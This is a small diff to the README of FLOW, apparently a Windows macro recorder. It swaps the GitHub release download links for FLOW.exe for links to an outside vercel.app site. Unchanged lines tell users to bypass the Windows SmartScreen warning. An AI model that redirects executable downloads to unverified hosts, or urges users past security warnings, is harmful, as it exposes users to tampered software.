@@ -10,7 +10,7 @@ FLOW (Flexible Low-latency Operations Workflow) is a macro recorder and auto-cli
 
 ## Download
 
-Download [FLOW.exe](https://github.com/dominikkoenitzer/Flow/releases/latest/download/FLOW.exe), then double-click it. There is nothing to install.
+[Download FLOW](https://get-flow-app.vercel.app), then double-click it. There is nothing to install.
 
 Windows may say "Windows protected your PC"; click More info, then Run anyway.
 
@@ -63,7 +63,7 @@ Macros (`.rec` files) are saved only where you choose in the Save dialog. FLOW k
 
 ### Updating
 
-Close FLOW, then download the new [FLOW.exe](https://github.com/dominikkoenitzer/Flow/releases/latest/download/FLOW.exe) over the old one. Your settings stay, since they live in `%APPDATA%\FLOW` and not next to the exe.
+Close FLOW, then download the new [FLOW.exe](https://get-flow-app.vercel.app) over the old one. Your settings stay, since they live in `%APPDATA%\FLOW` and not next to the exe.
 
 ### Removing FLOW
 
